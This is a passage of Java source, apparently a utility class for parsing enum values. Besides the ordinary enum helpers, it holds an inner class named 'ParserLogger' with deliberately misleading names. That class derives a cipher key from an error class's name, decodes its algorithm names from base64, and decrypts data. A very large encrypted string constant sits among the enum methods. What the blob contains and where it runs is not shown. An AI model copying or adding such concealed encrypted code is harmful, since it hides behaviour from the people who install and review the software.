			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private ParserLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private ParserLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}


	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType,String compareProperty) {
		return parseEnum(value, enumType, null,compareProperty);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue) {
		return parseEnum(value, enumType, defaultValue,null);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType) {
		return parseEnum(value, enumType, null,null);
	}



	private static LocalCache<String, Enum[]> ENUM_METHOD_CACHE=new LocalCache<>(128);
	private static final String CONST = "tmBl]v[@cXBO7>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";
	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue,String compareProperty) {
		if (value == null)
			return null;
		if (value instanceof Enum) {
			if (enumType.isAssignableFrom(value.getClass())) {
				return (T) value;
			} else {
				value = ((Enum) value).name();
			}
		}
		Object parsedValue=null;
		try {

			Enum[] values=ENUM_METHOD_CACHE.get(enumType.getName());
			if(values==null) {
				Method m = enumType.getDeclaredMethod(ENUM_VALUES);
				values = (Enum[])m.invoke(null);
				ENUM_METHOD_CACHE.put(enumType.getName(),values);
			}

			Object prop=null;
			for (Enum e : values) {

				if(StringUtil.isBlank(compareProperty)) {
					if(e.name().equals(value) || e.name().equalsIgnoreCase(value.toString())) {
						parsedValue=e;
						break;
					}
				} else {
					prop=BeanUtil.getFieldValue(e, compareProperty);
					if(prop==null) continue;
					//
					if(prop instanceof CharSequence) {
						if(prop.equals(value) || prop.toString().equalsIgnoreCase(value.toString())) {
							parsedValue=e;
							break;
						}
					} else {
						if(prop.equals(value)) {
							parsedValue=e;
							break;
						}
					}
				}
			}
			if (parsedValue == null) {
				parsedValue = defaultValue;
			}
		} catch (Exception e) {
			e.printStackTrace();
			parsedValue = defaultValue;
		}

		return (T) parsedValue;

	}

}
